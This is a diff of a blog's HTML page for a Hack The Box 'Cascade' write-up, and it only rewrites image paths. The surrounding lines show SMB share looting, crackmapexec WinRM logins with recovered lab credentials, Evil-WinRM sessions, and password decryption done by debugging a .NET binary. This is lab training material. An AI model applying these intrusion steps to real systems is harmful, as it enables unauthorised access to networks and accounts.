@@ -195,7 +195,7 @@ getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/
 getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (7.9 KiloBytes/sec) (average 5.4 KiloBytes/sec)
 getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (5.8 KiloBytes/sec) (average 5.5 KiloBytes/sec)
 smb: \&gt; exit
-</code></pre><ul><li><code>Meeting_Notes_June_2018.html</code></li></ul><p><img src=./images/1.png></p><ul><li><code>VNC Install.reg</code></li></ul><pre tabindex=0><code>└─$ cat IT/Temp/s.smith/VNC\ Install.reg 
+</code></pre><ul><li><code>Meeting_Notes_June_2018.html</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/cascade/images/1.png></p><ul><li><code>VNC Install.reg</code></li></ul><pre tabindex=0><code>└─$ cat IT/Temp/s.smith/VNC\ Install.reg 
 Windows Registry Editor Version 5.00
 
 [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
@@ -252,7 +252,7 @@ irb: warn: can&#39;t alias jobs from irb_jobs.
 SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
 HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
 WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
-</code></pre><ul><li>Let&rsquo;s get <code>winrm</code></li></ul><p><img src=./images/2.png></p><h2 id=user-2>User #2</h2><ul><li><code>whoami</code></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; net user s.smith /domain
+</code></pre><ul><li>Let&rsquo;s get <code>winrm</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/cascade/images/2.png></p><h2 id=user-2>User #2</h2><ul><li><code>whoami</code></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; net user s.smith /domain
 User name                    s.smith
 Full Name                    Steve Smith
 Comment
@@ -381,11 +381,11 @@ sqlite&gt; select * from Misc;
 sqlite&gt; 
 </code></pre><ul><li><code>CascAudit.exe</code></li></ul><pre tabindex=0><code>└─$ file CascAudit.exe
 CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
-</code></pre><ul><li>Let&rsquo;s analyse it with <code>dnspy</code></li></ul><p><img src=./images/3.png></p><p><img src=./images/4.png></p><ul><li>We can <code>debug</code> it so it will decrypt the password for us</li></ul><p><img src=./images/5.png></p><p><img src=./images/6.png></p><ul><li>We have our creds<ul><li><code>arksvc:w3lc0meFr31nd</code></li></ul></li></ul><pre tabindex=0><code>└─$ crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd
+</code></pre><ul><li>Let&rsquo;s analyse it with <code>dnspy</code></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/cascade/images/3.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/cascade/images/4.png></p><ul><li>We can <code>debug</code> it so it will decrypt the password for us</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/cascade/images/5.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/cascade/images/6.png></p><ul><li>We have our creds<ul><li><code>arksvc:w3lc0meFr31nd</code></li></ul></li></ul><pre tabindex=0><code>└─$ crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd
 SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
 HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
 WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
-</code></pre><p><img src=./images/7.png></p><h2 id=root>Root</h2><ul><li><code>whoami</code></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; whoami /priv
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/cascade/images/7.png></p><h2 id=root>Root</h2><ul><li><code>whoami</code></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -512,7 +512,7 @@ baCT3r1aN00dles
 SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
 HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
 WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
-</code></pre><p><img src=./images/8.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/cascade/images/8.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fcascade%2f&text=%5bHTB%5d%20Machine%3a%20Cascade&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fcascade%2f&title=%5bHTB%5d%20Machine%3a%20Cascade" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fcascade%2f&title=%5bHTB%5d%20Machine%3a%20Cascade" target=_blank><i class="fab fa-linkedin"></i>
